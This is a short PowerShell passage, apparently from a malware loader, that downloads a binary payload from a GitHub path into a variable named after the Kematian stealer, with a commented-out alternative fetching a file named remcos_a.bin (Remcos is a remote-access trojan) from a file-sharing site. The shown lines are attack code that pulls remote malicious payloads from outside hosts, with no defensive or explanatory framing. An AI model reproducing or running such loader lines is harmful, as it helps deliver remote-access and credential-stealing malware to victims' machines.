...
$kematianthegreat = (iwr -UseBasicParsing "https://github.com/43a1723/test/raw/main/Extras/hacklife/main.bin").Content
# $kematianthegreat = (iwr -UseBasicParsing "https://anonsharing.com/file/795cabb5f799b61f/remcos_a.bin").Content
